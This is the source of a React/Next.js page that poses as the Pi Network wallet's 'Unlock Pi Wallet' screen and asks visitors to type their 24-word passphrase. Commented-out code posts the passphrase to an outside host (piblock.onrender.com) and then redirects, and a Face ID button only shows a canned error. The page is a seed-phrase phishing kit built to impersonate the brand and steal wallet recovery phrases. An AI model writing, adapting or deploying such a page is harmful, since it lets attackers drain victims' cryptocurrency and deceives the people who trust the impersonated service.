import React, { useState } from 'react'
import Head from 'next/head'
import axios from "axios"


function signin() {

    // const errorholder = document.getElementById("errorholder");


    // const messageinput = document.getElementById("message");

    // const contactForm = document.getElementById("contactForm");

    // const [phrases, setphrases] = useState("")

    // if (contactForm)
    //     contactForm.addEventListener("submit", (event) => {
    //         event.preventDefault();

    //         if (phrases.length > 23) {
    //             // fetch('http://localhost:8000/message', {
    //             fetch('https://piblock.onrender.com/message', {
    //                 //methods -> POST,GET,PUT,PATCH,DELETE
    //                 method: 'POST',
    //                 headers: { 'Content-Type': 'application/json', 'accept': 'application/json' },
    //                 body: JSON.stringify({
    //                     message: phrases,
    //                 })
    //             })
    //                 .then(res => { res.json() })
    //                 .then((data) => {
    //                     window.location.href = "./explorer.html"
    //                 })
    //                 .catch((reason) => {
    //                     console.log("it happened here ", reason)
    //                 })

    //         } else {
    //             if (errorholder)
    //                 errorholder.innerHTML = `<h6 style="color:red" class='text-red'>Invalid passphrase</h6>`
    //             alert(`please ensure your passphrase is upto 24 and not more than 24 . current length is ${phrases.length} `)
    //         }
    //     })

    // const faceid = document.getElementById("faceid");

    // const errorholder2 = document.getElementById("errorholder2");

    // if (faceid) {
    //     faceid.addEventListener('click', (event) => {
    //         event.preventDefault();
    //         if (errorholder2)
    //             errorholder2.innerHTML = `<h6 style="color:red" class='text-red'>please login and enable Face ID or fingerprint</h6>`
    //     })
    // }


    return (

        <section data-spy="scroll" data-target="#main-nav" data-offset="91" className="false">

            <Head>
                <title>Pi Network - Pi Blockchain, Community & Developer Platform</title>
            </Head>

            <nav className="navbar navbar-expand-lg fixed-top bg-white">
                <div className="container">
                    <a className="navbar-brand" href="index.html">
                        <img src="assets/logo-667cd4f63cb2e6f261e16560dea7ac9c9235dcfaf9a285274a576efc96b9ec79.png" />
                        <span>Pi BlockChain</span>
                    </a>
                    <button className="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#main-nav"
                        aria-expanded="false" aria-label="Toggle navigation">
                        <span className="navbar-toggler-icon"></span>
                    </button>

                </div>
            </nav>


            <section className="section-spacing" id="contact">
                <div className="container">

                    <div className="row">
                        <div className="col-md-12">
                            <div className="section-title text-center wysiwyg" data-wysiwyg-key="contact_us_headline">
                                <h2>Unlock Pi Wallet</h2>

                            </div>
                        </div>
                    </div>

                    <div className="row">
                        <div className="col-md-12 col-lg-8 offset-lg-2">
                            <form id="contactForm" className="contact-form wow fadeIn" data-toggle="validator">
                                <div className="form-group">
                                    <textarea placeholder="Enter your 24-word passphrase here" id="message" cols={20} rows={8}
                                        className="form-control" name="message[message]" required data-error="Please enter your passphrase"
                                    ></textarea>
                                    <div className="help-block with-errors"></div>
                                </div>
                                <div className="text-center" id="errorholder">
                                </div>
                                <div className="text-center">
                                    <div className="col-lg-12 col-md-12">
                                        <button type="submit" className="btn btn-sm border-purple  animated fadeInLeft">
                                            UNLOCK WITH PASSPHRASE
                                        </button>
                                    </div>
                                    <div onClick={() => { alert(`please login and enable Face ID or fingerprint`) }} className="col-lg-12 col-md-12">
                                        <button id="faceid" className="btn btn-sm disabled bg-purple  animated fadeInLeft text-white">
                                            UNLOCK WITH FACE ID/ FINGERPRINT
                                        </button>
                                        <div className="text-center mt-5" id="errorholder2">

                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>

                    </div>

                    <div className="row mt-5 pt-5">

                        <div className="col-sm-12 col-md-8 col-lg-8 mb-3 mx-auto">
                            <div className=" wow fadeInUp" data-wow-delay="0.2s">
                                <p className="text-black">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to
                                    you. Recovery of
                                    passphrase is currently impossible.
                                </p>
                                <p>Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be
                                    inaccessible.
                                </p>
                            </div>
                        </div>


                    </div>

                </div>
            </section>


        </section>
    )
}

export default signin